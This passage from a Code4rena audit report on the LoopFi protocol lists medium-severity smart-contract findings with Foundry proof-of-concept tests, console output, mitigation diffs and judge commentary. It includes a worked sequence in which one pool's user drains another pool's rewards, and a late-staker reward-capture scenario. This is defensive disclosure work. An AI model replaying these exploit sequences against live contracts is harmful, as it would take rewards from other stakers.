[-----A-----|-----B-----] (pool 1) [-----------C-----------] (pool 2) Day: 0 x y z Suppose there are 2 pools (represented by the first and second [] block respectively) that are eligible for rewards. And day y is the value endRewardTime() returns. And day z is a value larger than day y. Part A represents the rewards that are to be claimed by pool 1 during the time period [0,x), Part B represents [x,y) for pool 1 as well, while Part C represents the full rewards that are to be claimed by pool 2 during [0,y). Below I will explain the sequence which allows pool 1 to steal 1/4 of part C from pool 2.

Both pools start accumulating rewards from day 0.

At day x, user in pool 1 changes his debt (by any amount). This will trigger _modifyPosition (in CDPVault.sol) which will call handleActionAfter (in ChefIncentiveController.sol).

handleActionAfter in ChefIncentiveController.sol will call _updatePool for pool 1 only, adding part A (refer to symbol diagram) into accountedRewards. (Through this line accountedRewards = accountedRewards + reward; inside _updatePool ).

Now suppose on day z (which is greater than day y ), the user in pool 1 tries to claim, claim will then call _updatePool which will then call _newRewards.

Now lets go through what happens inside _newRewards:

duration gets set to z - pool.lastRewardTime = z - x.

rawReward gets set to duration * rewardsPerSecond.

availableRewards() returns depositedRewards - accountedRewards; hence, availableRewards() = part B+C (since A is already in accountedRewards ).

Since z > y, availableRewards() will be < rawReward for some values of z, this results in the function setting rawReward = availableRewards(); inside the if statement.

So now, rawReward = availableRewards() = part B+C.

Hence, the value returned by _newRewards for pool 1 will include part C which is supposed to be pool 2’s rewards; effectively allowing user from pool 1 to steal a fraction of another user’s rewards from pool 2. (In this scenario, pool 1 can steal 1/4 of part C ).

Proof of Code The below code is the coded version of the explanation above:

function test_durationHack () public { rewardsPerSecond = 1 ether; //changed to make console output more understandable endingTimeCadence = 30 seconds; incentivesController.

setRewardsPerSecond ( rewardsPerSecond, true ); incentivesController.

setEndingTimeUpdateCadence ( endingTimeCadence ); address Alice = address ( 0x123 ); address Bob = address ( 0x567 ); address vault1 = address ( 0x1 ); uint256 totalAllocPoint = 1000; incentivesController.

addPool ( vault1, totalAllocPoint / 2 ); //give both pools equal allocation for convenience address vault2 = address ( 0x2 ); incentivesController.

addPool ( vault2, totalAllocPoint / 2 ); //give both pools equal allocation for convenience loopToken.

mint ( address ( incentivesController ), 120 ether ); incentivesController.

registerRewardDeposit ( 120 ether ); //give out 120 ether as incentive vm.

mockCall ( mockEligibilityDataProvider, abi.

encodeWithSelector ( IEligibilityDataProvider.

lastEligibleStatus.

selector, Alice ), abi.

encode ( true ) ); vm.

mockCall ( mockEligibilityDataProvider, abi.

encodeWithSelector ( EligibilityDataProvider.

refresh.

selector, Alice ), abi.

encode ( true ) ); vm.

prank ( vault1 ); //set msg.sender to vault1 incentivesController.

handleActionAfter ( Alice, 1 ether, 1 ether ); //simulates Alice taking on a debt of 1 ether at vault1 vm.

mockCall ( mockEligibilityDataProvider, abi.

encodeWithSelector ( IEligibilityDataProvider.

lastEligibleStatus.

selector, Bob ), abi.

encode ( true ) ); vm.

mockCall ( mockEligibilityDataProvider, abi.

encodeWithSelector ( EligibilityDataProvider.

refresh.

selector, Bob ), abi.

encode ( true ) ); vm.

prank ( vault2 ); //set msg.sender to vault2 incentivesController.

handleActionAfter ( Bob, 1 ether, 1 ether ); //simulates Bob taking on a debt of 1 ether at vault2 // based on the above scenario, each Alice and Bob are supposed to get 60 ether each at the end.

skip ( 1 minutes ); // go to the 1 minute mark (day x in the symbol diagram) vm.

mockCall ( mockEligibilityDataProvider, abi.

encodeWithSelector ( IEligibilityDataProvider.

lastEligibleStatus.

selector, Alice ), abi.

encode ( true ) ); vm.

mockCall ( mockEligibilityDataProvider, abi.

encodeWithSelector ( EligibilityDataProvider.

refresh.

selector, Alice ), abi.

encode ( true ) ); vm.

prank ( vault1 ); //set msg.sender to vault1 incentivesController.

handleActionAfter ( Alice, 1 ether - 1 wei, 1 ether - 1 wei ); //simulates Alice changing debt by any insignificant amount in vault1, resulting in _updatePool being called for vault1 skip ( 1 minutes ); //further skip 1 minute, reaching the **2 minute mark** (day y in the symbol diagram) console.

log ( "Alice rewards at 2 minutes:", incentivesController.

allPendingRewards ( Alice )); // 2 minutes is the time at which 60 ether should be given to each of Alice and Bob, and no one is supposed to get more afterwards if not for the bug skip ( 1 minutes ); // (day z in the symbol diagram) console.

log ( "Alice rewards at 3 minutes:", incentivesController.

allPendingRewards ( Alice )); // as you can see Alice continues to receive rewards even after she isnt supposed to, exploiting the difference in pool.lastRewardTime to do so console.

log ( "Bob's reward at the end: ", incentivesController.

allPendingRewards ( Bob )); } Console Output:

Ran 1 test for src/test/unit/ChefIncentivesController.t.sol:ChefIncentivesControllerTest [PASS] test_durationHack() (gas: 688851) Logs:

Alice rewards at 2 minutes: 59999999999999999970 Alice rewards at 3 minutes: 74999999999999999955 Bob's reward at the end: 45000000000000000000 Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.68ms (1.13ms CPU time) Ran 1 test suite in 301.12ms (5.68ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests) Notable comments:

The first handleActionAfter is where we simulate Alice taking on 1 ether debt inside vault1.

The second handleActionAfter is where we simulate Bob taking on 1 ether debt inside vault2.

The last handleActionAfter is where we simulate Alice changing her debt by an insignificant amount in vault1, resulting in _updatePool being called for only vault1.

Since we mint 120 ether as rewards and we set rewardsPerSecond = 1 ether, and both Alice and Bob start staking the same amounts at the same time in different pools of equal point allocation weightage, at the end of 2 minutes, both Alice and Bob should have received equal amounts of reward ( 60 ether each ).

However, we can see in the console output that Alice continues to gain tokens past 2 minutes and at the end has 74999999999999999955 tokens ~= 75 ether, while Bob only has 45 ether.

Alice has successfully taken advantage of the difference in pool’s lastRewardTime bug, to steal 15 ether of rewards from Bob, resulting in a permanent loss of rewards for Bob. (the 15 ether here is basically the 1/4 of part C in the symbol diagram explanation).

## Recommended Mitigation Steps

struct VaultInfo { uint256 totalSupply; uint256 allocPoint; // How many allocation points assigned to this vault.

uint256 lastRewardTime; // Last second that reward distribution occurs.

uint256 accRewardPerShare; // Accumulated rewards per share, times ACC_REWARD_PRECISION. See below.

+ uint256 accountedRewards; } function _updatePool(VaultInfo storage pool, uint256 _totalAllocPoint) internal { uint256 timestamp = block.timestamp; uint256 endReward = endRewardTime(); if (endReward <= timestamp) { timestamp = endReward; } if (timestamp <= pool.lastRewardTime) { return; } (uint256 reward, uint256 newAccRewardPerShare) = _newRewards(pool, _totalAllocPoint); accountedRewards = accountedRewards + reward; + pool.accountedRewards = pool.accountedRewards + reward; pool.accRewardPerShare = pool.accRewardPerShare + newAccRewardPerShare; pool.lastRewardTime = timestamp; } function _newRewards( VaultInfo memory pool, uint256 _totalAllocPoint ) internal view returns (uint256 newReward, uint256 newAccRewardPerShare) {

uint256 lpSupply = pool.totalSupply; if (lpSupply > 0) { uint256 duration = block.timestamp - pool.lastRewardTime; uint256 rawReward = duration * rewardsPerSecond; - uint256 rewards = availableRewards(); + uint256 rewards = (depositedRewards * pool.allocPoint / _totalAllocPoint) - pool.accountedRewards; if (rewards < rawReward) { rawReward = rewards; } - newReward = (rawReward * pool.allocPoint) / _totalAllocPoint; + newReward = rawReward; newAccRewardPerShare = (newReward * ACC_REWARD_PRECISION) / lpSupply; } After those changes, console output is now showing that rewards are distributed accurately ( 60 ether each):

Ran 1 test for src/test/unit/ChefIncentivesController.t.sol:ChefIncentivesControllerTest [PASS] test_durationHack() (gas: 713083) Logs:

Alice rewards at 2 minutes: 60000000000000000000 Alice rewards at 3 minutes: 60000000000000000000 Bob's reward at the end: 60000000000000000000 Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 34.47ms (4.83ms CPU time) Ran 1 test suite in 348.00ms (34.47ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests) Tools Used Foundry, VSCode

## Assessed type

Math amarcu (LoopFi) confirmed and commented:

This is a grieve attack on rewards and not user funds. Maybe it should be a medium.

Koolex (judge) decreased severity to Medium

# [M-23] The debt in EligibilityDataProvider::requiredUsdValue() needs to be converted into USD; otherwise, it is not a correct value comparison

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-23
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

EligibilityDataProvider::requiredUsdValue() needs to be converted into USD; otherwise, it is not a correct value comparison Submitted by lian886, also found by pkqs90 and nnez

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/EligibilityDataProvider.sol#L187
- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/EligibilityDataProvider.sol#L197
- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/EligibilityDataProvider.sol#L274
- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/EligibilityDataProvider.sol#L177

## Impact

It does not align with the documentation and the eligibility criteria for rewards are lower than what is specified by the protocol.

## Recommended Mitigation Steps

In the requiredUsdValue function, the debt value is first calculated and then multiplied by the relevant ratio. In fact, Radiant Capital implements this exact approach in their code, as shown here.

## Assessed type

Error amarcu (LoopFi) confirmed

# [M-24] lastRPS could be set to 0 accidentally

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-24
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

lastRPS could be set to 0 accidentally Submitted by 0xpiken, also found by zzebra83 and rscodes New reward distribution can not start automatically when lastRPS is set to 0 accidentally.

## Recommended Mitigation Steps

lastRPS should not be updated when rewardsPerSecond is 0:

function _updateEmissions() internal { if (block.timestamp > endRewardTime()) { _massUpdatePools(); - lastRPS = rewardsPerSecond; + if (rewardsPerSecond != 0) { + lastRPS = rewardsPerSecond; + } rewardsPerSecond = 0; return; } setScheduledRewardsPerSecond(); }

## Assessed type

Invalid Validation amarcu (LoopFi) confirmed 0xAlix2 (warden) commented:

@Koolex - The report shows a valid scenario where lastRPS could end up being 0; however, this is intended, if the rewardsPerSecond is set to 0 then so does lastRPS, as it represents last RPS, used during refill after reserve empty.

Moreover, the report claims that new rewards can’t be registered by calling registerRewardDeposit, because of the 0 value of lastRPS. However, the owner could simply call setRewardsPerSecond to reset it, and everything will continue to work as expected. Hence, this is invalid.

zzebra83 (warden) commented:

I agree with some of your points, and I think your conclusion is based off how this report is written and also the mitigation it suggests.

When the admin calls setRewardsPerSecond, their intention could be to persist an RPS value for all epochs going forward. This RPS value will then be used when calculating rewards claimable by users. However, by calling the claim function more than once as mentioned in this report, both RPS and last RPS reset to 0; hence, reward distribution is effectively DOS’d.

The only way this can then be fixed is if the admin is made aware of the issue and then sets RPS value again by calling setRewardsPerSecond like you mentioned. But the issue is not fixed and will keep on happening and reward distribution to users will keep on getting disrupted and so on. Medium severity is appropriate, in my opinion.

Koolex (judge) commented:

Thank you for the input. Stays as-is.

# [M-25] Incorrect address is used as spender for ERC20 permit signature verification

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-25
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

spender for ERC20 permit signature verification Submitted by 0xpiken, also found by Rhaydden, hash, and pkqs90 The failure of permit signature verification might revert the whole function.

PositionAction#increaseLever() might revert if ERC20 permit signature is used as permitParams

## Recommended Mitigation Steps

Use address(this) as spender for safePermit():

IERC20Permit(token).safePermit( from, - to, + address(this), params.approvalAmount, params.deadline, params.v, params.r, params.s ); IERC20(token).safeTransferFrom(from, to, amount);

## Assessed type

Context amarcu (Loopfi) confirmed Infect3d (warden) commented:

I believe the issue is invalid. Every instance of the code where TransferAction::_transferFrom is called uses to == address(this) (or self which is address(this) ):

PositionAction.sol#L323-L323 PositionAction.sol#L520-L520 PositionAction.sol#L579-L579 SwapAction.sol#L100-L100 PoolAction.sol#L93-L93 PoolAction.sol#L104-L104 pkqs90 (warden) commented:

As stated in the report, the PositionAction#increaseLever() will have an issue. Because self is not address(this) when triggered by delegatecall through a PRBProxy.

self is the PositionAction.sol, while address(this) is the proxy’s address.

Koolex (judge) commented:

No further change on this.

# [M-26] PoolV3#repayCreditAccount() use incorrect share converting function to calculate profit and loss

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-26
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PoolV3#repayCreditAccount() use incorrect share converting function to calculate profit and loss Submitted by 0xpiken, also found by Afriauditor ( 1, 2 ), Agontuk, VAD37, monrel, and Trooper

- https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L549
- https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L553

## Impact

Either the profit or the loss is calculated incorrectly, resulting in the treasury owns incorrect profit balance.

## Recommended Mitigation Steps

Use _convertToShares() for share calculation:

if (profit > 0) { - _mint(treasury, convertToShares(profit)); // U:[LP-14B] + _mint(treasury, _convertToShares(profit)); } else if (loss > 0) { address treasury_ = treasury; uint256 sharesInTreasury = balanceOf(treasury_); - uint256 sharesToBurn = convertToShares(loss); + uint256 sharesToBurn = _convertToShares(loss); if (sharesToBurn > sharesInTreasury) { unchecked { emit IncurUncoveredLoss({ creditManager: msg.sender, loss: convertToAssets(sharesToBurn - sharesInTreasury) }); // U:[LP-14D] } sharesToBurn = sharesInTreasury; } _burn(treasury_, sharesToBurn); // U:[LP-14C,14D] }

## Assessed type

Math 0xtj24 (LoopFi) confirmed

# [M-27] Rewards may be spread out among the wrong time period due to the way the protocol calculates it

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-27
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

Submitted by rscodes First, lets reference how the rewards are calculated when a 2nd incentive is introduced while another incentive is still within its rewardsDuration period.

In MultiFeeDistribution.sol ’s _notifyReward function:

// inside function _notifyReward(address rewardToken, uint256 reward):

if ( block.

timestamp >= r.

periodFinish ) {.....

} else { -> uint256 remaining = r.

periodFinish - block.

timestamp; -> uint256 leftover = ( remaining * r.

rewardPerSecond ) / 1e12; -> r.

rewardPerSecond = (( reward + leftover ) * 1e12 ) / rewardsDuration; } This will cause rewards from the initial incentive to be delayed and spread out across the 2nd incentive’s period and initial stakers will have wrong amount of claimable rewards during the timestamps all the way until the 2nd incentive’s rewardsDuration ends. Other than delays, the original staker could also possibly permanently lose some of their deserved reward tokens, as described further below in “2nd way of exploit” section.

Proof of Code The symbol diagram below demonstrates the scenario ran in the foundry test:

[----A----|----B----] (1st incentive) [---------C---------] (2nd incentive) Day: 0 15 30 45 We will use rewardsDuration = 30 days.

The first [] represents the 1st incentive, which was introduced on day 0, where A represents the first half of the rewards that should be given out during the first half of the first incentive’s rewardDuration period. And B represents the second half respectively.

The second [] represents the 2nd incentive, which was introduced on day 15, where C represents all the rewards from the 2nd incentive to be rewarded.

01:

function test_rewardsSpreadAcrossWrongPeriod () public { 02:

assert ( rewardsDuration == 30 days ); // we will use 30 days as the rewardsDuration for convenience 03:

address Alice = address ( 0x123456 ); 04:

uint256 amount = 1 ether; 05:

uint256 [] memory lockDurations = new uint256 []( 1 ); 06:

uint256 [] memory rewardMultipliers = new uint256 []( 1 ); 07:

lockDurations [ 0 ] = 700 days; 08:

rewardMultipliers [ 0 ] = 1; 09:

multiFeeDistribution.

setLockTypeInfo ( lockDurations, rewardMultipliers ); 10:

11:

stakeToken.

mint ( address ( this ), amount ); 12:

multiFeeDistribution.

setLPToken ( address ( stakeToken )); 13:

14:

multiFeeDistribution.

setAddresses ( IChefIncentivesController ( vm.

addr ( uint256 ( keccak256 ( "incentivesController" )))), vm.

addr ( uint256 ( keccak256 ( "treasury" )))); 15:

vm.

mockCall ( 16:

vm.

addr ( uint256 ( keccak256 ( "incentivesController" ))), 17:

abi.

encodeWithSelector ( IChefIncentivesController.

afterLockUpdate.

selector, Alice ), 18:

abi.

encode ( true ) 19: ); 20:

stakeToken.

approve ( address ( multiFeeDistribution ), amount ); 21:

multiFeeDistribution.

stake ( amount, Alice, 0 ); // Alice now has 1 ether staked (with lockTypeIndex=0) 22:

require ( multiFeeDistribution.

lockedBalance ( Alice ) == amount ); 23:

24:

address [] memory minters = new address []( 1 ); 25:

minters [ 0 ] = address ( this ); 26:

multiFeeDistribution.

setMinters ( minters ); 27:

28:

amount = 10000 ether; 29:

loopToken.

mint ( address ( this ), amount ); 30:

loopToken.

transfer ( address ( multiFeeDistribution ), amount ); 31:

32:

vm.

mockCall ( 33:

mockPriceProvider, 34:

abi.

encodeWithSelector ( IPriceProvider.

getRewardTokenPrice.

selector, address ( loopToken ), amount ), 35:

abi.

encode ( 8 ) 36: ); 37:

multiFeeDistribution.

vestTokens ( address ( multiFeeDistribution ), amount, false ); //1st incentive introduced on day 0 38:

39:

skip ( 15 days ); //go to day 15 40:

address [] memory rewardTokens_ = new address []( 1 ); 41:

rewardTokens_ [ 0 ] = address ( loopToken ); 42:

vm.

prank ( Alice ); 43:

multiFeeDistribution.

getReward ( rewardTokens_ ); //withdraw at day 15 44:

console.

log ( "Alice's balance at day 15| ", loopToken.

balanceOf ( Alice )); 45:

46:

loopToken.

mint ( address ( this ), amount ); 47:

loopToken.

transfer ( address ( multiFeeDistribution ), amount ); 48:

multiFeeDistribution.

vestTokens ( address ( multiFeeDistribution ), amount, false ); //2nd incentive introduced on day 15 49:

50:

skip ( 15 days ); //go to day 30 51:

vm.

prank ( Alice ); 52:

multiFeeDistribution.

getReward ( rewardTokens_ ); //withdraw at day 30 53:

console.

log ( "Alice's balance at day 30|", loopToken.

balanceOf ( Alice )); //reminder: Alice's current loopToken balance is inclusive of what she withdrew on day 15 54: } Console Output:

Ran 1 test for src/test/unit/MultiFeeDistribution.t.sol:MultiFeeDistributionTest [PASS] test_rewardsSpreadAcrossWrongPeriod() (gas: 813968) Logs:

Alice's balance at day 15| 4999999999999999999999 Alice's balance at day 30| 12499999999999999999998 Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.43ms (1.46ms CPU time) Ran 1 test suite in 320.56ms (6.43ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests) Explanation:

(Line 37) As mentioned, we introduce the first incentive ( 10000 ether ) at day 0.

(Line 43) At day 15, Alice withdraws her tokens, receiving part A as seen in the symbol diagram. ( 4999999999999999999999 ~= 5000 ether ) (Line 48) 2nd Incentive ( 10000 ether ) is introduced at day 15, causing remaining rewards leftover from the first incentive to be incorrectly stretched until the end of the 2nd incentive’s rewardDuration.

(Line 52) At day 30, Alice withdraws her tokens, now her total balance is 12499999999999999999998 ~= 12500 ether.

Let’s examine Alice’s balance at the end of 30 days:

12500 ether = 5000 ether + 2500 ether + 5000 ether = A + B/2 + C/2.

However, the rightful amount of rewards her balance should be at day 30 is:

A + B + C/2 = 15000 ether. The remaining 15000 ether - 12500 ether = 2500 ether that Alice is entitled to claim at day 30, will only be given throughout days 30 to 45.

This is very unfair to Alice who has staked her tokens since the beginning of the first incentive, and now she has to wait longer for the rewards from the first incentive which is a high opportunity cost incurred for her.

This is made worse if the incentive given at the 2nd wave is significantly smaller than the original amount in wave 1, because it means she will have to wait longer for her significant rewards from the 1st wave; all because of the 2nd wave of small and insignificant incentive.

2nd way of exploit Referencing the same scenario in the Proof of Code section. A malicious staker can choose to stake anytime between day 30 to day 45 and because of that, Alice can permanently lose some of her rewards.

Example:

Malicious staker sees the scenario in the above section happening, and decides to call stake on day 30.

When the malicious staker withdraws on day 45, he is able to receive a portion of reward part B, even though he is not supposed to; we already established in the symbol diagram that part B is supposed to end on day 30. Since the malicious staker only staked on day 30, he should not be getting the rewards as he locked his tokens late. Alice permanently loses a portion of reward part B to the malicious staker who is not supposed to receive it.

Overall Disclaimer:

The example above of the 2nd incentive being introduced at exactly halfway (15 days) of the 1st incentive’s duration was just used as an example. This bug still exists as long as the 2nd incentive is introduced at any point of time throughout the 1st incentive’s duration, causing the respective portion to be spread across the wrong period.

## Recommended Mitigation Steps

+ struct rewardQueue { + uint256 periodFinish; + uint256 rewardPerSecond; + } // below is the struct from src/reward/interfaces/LockedBalance.sol struct Reward { - uint256 periodFinish; - uint256 rewardPerSecond; + rewardQueue[] rewards; + uint256 rewardCounter; uint256 lastUpdateTime; uint256 rewardPerTokenStored; uint256 balance; } We can use a queue-like list to store rewards and their respective periodFinish, as well as a counter that we can increment when rewards[rewardCounter].periodFinish < block.timestamp.

rewards[i].rewardsPerSecond is meant to be distributed between the timeframe of rewards[i-1].periodFinish to rewards[i].periodFinish only.

Tools Used Foundry, VSCode

## Assessed type

Math amarcu (LoopFi) confirmed 0xAlix2 (warden) commented:

@Koolex - MultiFeeDistribution is an exact fork of Radiant’s; the scenario that the warden pointed out to is intended.

Koolex (judge) decreased severity to Medium and commented:

While this is an exact fork of Radiant, it does not mean it wouldn’t have issues. The following both statements could be right:

Sponsor has intention the same Radiant has on their contract, therefore, the issue above would be a QA.

Sponsor has intention the same Radiant has on their contract, but couldn’t know this issue exists (regardless if it was intended by Radiant), unless subjecting it to an audit which is what happened.

However, since the sponsor confirmed this, a Medium severity is appropriate.

# [M-28] BalancerOracle::update() can return a stale price

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-28
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

BalancerOracle::update() can return a stale price Submitted by 4B, also found by Bauchibred and Evo Whenever block.timestamp - lastUpdate > updateWaitWindow and needs to update the price, it will return a stale price because it will fetch the price from the lastUpdate not the currentUpdate.

## Recommended Mitigation Steps

Revisit the logic to be able to fetch fresh price whenever there need to be a new price fetched.

## Assessed type

Oracle 0xtj24 (LoopFi) acknowledged and commented:

That logic updates the price only after a certain updateWaitWindow has passed, storing the oldest safe price. If not updated with the keeper it will return stale price depending on the stalePeriod. This is an expected behaviour.

Koolex (judge) commented:

Since updateWaitWindow is immutable, it can’t be changed. Therefore, keeping the severity to Medium.

# [M-29] Bug in claim allows users who are disqualified to claim their previously earned emissions

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-29
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

claim allows users who are disqualified to claim their previously earned emissions Submitted by rscodes, also found by pkqs90 In ChefIncentivesController.sol:

function claim ( address _user, address [] memory _tokens ) public whenNotPaused { if ( eligibilityMode != EligibilityModes.

DISABLED ) { -> if (!

eligibleDataProvider.

isEligibleForRewards ( _user )) revert EligibleRequired (); -> checkAndProcessEligibility ( _user, true, true ); }........

} The function calls isEligibleForRewards without calling refresh; hence, things like disqualification resulting from a change in price will not be accounted for. This transaction will go through without reverting, allowing the user to claim even though his total value locked is now below 5% of his debt due to the price change of the token.

The checkAndProcessEligibility(_user, true, true); function, however, does include refresh, which will update the user’s status. Hence, that line should be called first, so that the transaction will revert in the if statement, to prevent malicious lockers from calling this function even when they are not eligible.

## Recommended Mitigation Steps

function claim(address _user, address[] memory _tokens) public whenNotPaused { if (eligibilityMode != EligibilityModes.DISABLED) { - if (!eligibleDataProvider.isEligibleForRewards(_user)) revert EligibleRequired(); - checkAndProcessEligibility(_user, true, true); // swap the order !!

+ checkAndProcessEligibility(_user, true, true); + if (!eligibleDataProvider.isEligibleForRewards(_user)) revert EligibleRequired(); } _updateEmissions(); uint256 currentTimestamp = block.timestamp; uint256 pending = userBaseClaimable[_user]; userBaseClaimable[_user] = 0; uint256 _totalAllocPoint = totalAllocPoint; uint256 length = _tokens.length; for (uint256 i; i < length; ) { if (!validRTokens[_tokens[i]]) revert InvalidRToken(); VaultInfo storage pool = vaultInfo[_tokens[i]]; if (pool.lastRewardTime == 0) revert UnknownPool(); _updatePool(pool, _totalAllocPoint); UserInfo storage user = userInfo[_tokens[i]][_user]; uint256 rewardDebt = (user.amount * pool.accRewardPerShare) / ACC_REWARD_PRECISION;

pending = pending + rewardDebt - user.rewardDebt; user.rewardDebt = rewardDebt; user.lastClaimTime = currentTimestamp; unchecked { i++; } _vestTokens(_user, pending); eligibleDataProvider.updatePrice(); }

## Assessed type

Invalid Validation amarcu (LoopFi) confirmed and commented:

Other users can claim if a user becomes ineligible, if no one claims the user can, but the check can be added. Would consider this a Medium.

Koolex (judge) decreased severity to Medium and commented:

@amarcu - per my understanding, the issue is, users are claiming based on outdated eligibility check since checkAndProcessEligibility is called after.

# [M-30] Usage of lastEligibleStatus can cause user to miss out on rewards on manualStopEmissionsFor invocation

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-30
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

lastEligibleStatus can cause user to miss out on rewards on manualStopEmissionsFor invocation Submitted by hash, also found by lanrebayode77 and novamanbg Invoking manualStopEmissionsFor can cause the user to miss out on rewards from vaults even after the user becomes eligible.

## Recommended Mitigation Steps

The lastEligibleStatus check can be removed or it can be handled alongside the manualStopEmissionsFor implementation.

amarcu (LoopFi) confirmed

# [M-31] Discrepancy between the lastRewadTime and the lastAllPoolUpdate can allow for incorrect reward distribution to pools if registerRewardDeposit deposits less assets

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-31
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

lastRewadTime and the lastAllPoolUpdate can allow for incorrect reward distribution to pools if registerRewardDeposit deposits less assets Submitted by hash, also found by Rhaydden, seaona, lanrebayode77, lian886, and novamanbg Incorrect reward distribution causing some pools to gain more while others to gain less.

## Recommended Mitigation Steps

In case endTime > block.timestamp, can set the lastPoolUpdate to endTime or always ensure that the registerRewardDeposit function will only be called with amounts such that the above issue doesn’t occur.

## Assessed type

Context amarcu (LoopFi) confirmed

# [M-32] Emission schedule is not followed and can cause unexpected allocation of rewards

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-32
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

Submitted by hash Whenever a new emission schedule is to be followed, i.e., block.timestamp becomes greater than the startOffset of the schedule, the setScheduledRewardsPerSecond function invokes the _massUpdatePools function in order to bring the pools to the latest state.

function setScheduledRewardsPerSecond () internal { if (!

persistRewardsPerSecond ) { uint256 length = emissionSchedule.

length; uint256 i = emissionScheduleIndex; uint128 offset = uint128 ( block.

timestamp - startTime ); for (; i < length && offset >= emissionSchedule [ i ].

startTimeOffset; ) { unchecked { i ++; } if ( i > emissionScheduleIndex ) { emissionScheduleIndex = i; => _massUpdatePools (); rewardsPerSecond = uint256 ( emissionSchedule [ i - 1 ].

rewardsPerSecond ); } Inside the _massUpdatePools, the previous rewardsPerSecond is used until block.timestamp instead of the startOffset of the new schedule; i.e., the correct update of oldRewardsPerSecond * (newScheduleStartTimestamp - lastUpdateStamp) + newRewardsPerSecond * (block.timestamp - newScheduleStartTimestamp) is not used.

_massUpdatePools -> _updatePool -> _newRewards function _newRewards ( VaultInfo memory pool, uint256 _totalAllocPoint ) internal view returns ( uint256 newReward, uint256 newAccRewardPerShare ) { uint256 lpSupply = pool.

totalSupply; if ( lpSupply > 0 ) { uint256 duration = block.

timestamp - pool.

lastRewardTime; uint256 rawReward = duration * rewardsPerSecond;

## Recommended Mitigation Steps

Correct the formula to similar like:

oldRewardsPerSecond * (newScheduleStartTimestamp - lastUpdateStamp) + newRewardsPerSecond * (block.timestamp - newScheduleStartTimestamp).

amarcu (LoopFi) confirmed pkqs90 (warden) commented:

@Koolex - this ChefIncentivesController code is basically the same as RadiantV2.

I think all public Radiant issues should be out-of-scope, and that sponsors are aware of. Specifically, this report from Blocksec: “3.2.4 Potential Issue 5: Skippable Emission schedules” talks about basically the same thing as this issue, which is that emissions schedules may be not followed (and even skipped).

It is understandable for Radiant to not fix this since this is a edge case considering that emission schedule is updated frequently and the impacted amount of tokens are very small.

Koolex (judge) commented:

This issue is different than the one reported by Blocksec. Here, it is about the math, theirs is about skipping a schedule if the function is not invoked.

However, even if it is the same, as per my knowledge, there is no rule in C4 that says public issues somewhere else are out of scope, also not mentioned by the sponsor.

Given above, this issue stays as-is.

# [M-33] PositionAction.sol#onCreditFlashLoan may have leftover tokens after conducting leverParams.auxSwap

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-33
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PositionAction.sol#onCreditFlashLoan may have leftover tokens after conducting leverParams.auxSwap Submitted by pkqs90, also found by pkqs90, lian886, Bauchibred, 0xbepresent, and hash ( 1, 2 ) First, let’s inspect how deposit decreaseLever with swap enabled works:

Borrow loans from flashLender.

Repays CDPVault debt with the borrowed loans.

Withdraws collateral from CDPVault.

Conducts a leverParams.primarySwap and swap collateral to debt token.

Now, step 4 is an EXACT_OUT swap, since it is forced to swap the exact amount of debt tokens used to repay the flashloan. However, after step 4, there may be some collateral tokens left, which is the residualAmount.

If leverParams.auxSwap is not enabled, the collateral token is simply sent back to the recipient. However, if leverParams.auxSwap is enabled, a swap is performed.

